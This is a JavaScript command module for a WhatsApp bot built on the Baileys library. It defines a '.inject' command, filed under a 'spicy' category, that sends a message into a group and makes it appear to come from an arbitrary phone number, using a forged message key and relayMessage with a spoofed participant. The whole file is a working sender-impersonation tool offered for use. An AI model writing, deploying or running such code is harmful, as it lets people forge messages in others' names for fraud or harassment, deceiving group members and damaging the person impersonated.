module.exports = {
    name: "inject",
    aliases: ["msginject", "spoof", "fakemsg"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];

            // usage: .inject <number> <groupJid> <message>
            // example: .inject 2331234567890 120363xxxxxxxx@g.us Hello everyone
            if (args.length < 3) {
                return await ctx.reply(
                    "*Usage:* .inject <number> <groupJid> <message>\n\n" +
                    "*Example:*\n" +
                    ".inject 233123456789 120363xxxxxx@g.us Hey guys what's up"
                );
            }

            const targetNumber = args[0].replace(/[^0-9]/g, "");
            const groupJid = args[1];
            const message = args.slice(2).join(" ");

            if (!groupJid.endsWith("@g.us")) {
                return await ctx.reply("❌ Group JID must end with @g.us");
            }

            const spoofedJid = `${targetNumber}@s.whatsapp.net`;

            // ── core injection ──
            // construct a fake message key attributed to the spoofed JID
            const fakeKey = {
                remoteJid: groupJid,
                fromMe: false,
                id: `FAKE_${Date.now()}`,
                participant: spoofedJid
            };

            // method 1 — relayMessage (most reliable on most baileys forks)
            await sock.relayMessage(
                groupJid,
                {
                    conversation: message
                },
                {
                    messageId: fakeKey.id,
                    participant: spoofedJid,
                    additionalAttributes: {
                        participant: spoofedJid
                    }
                }
            );

            await ctx.reply(
                `✅ Injected.\nSpoofed: +${targetNumber}\nGroup: ${groupJid}\nMsg: ${message}`
            );

        } catch (e) {
            console.error("[inject]", e);
            await ctx.reply("❌ Failed: " + e.message);
        }
    }
};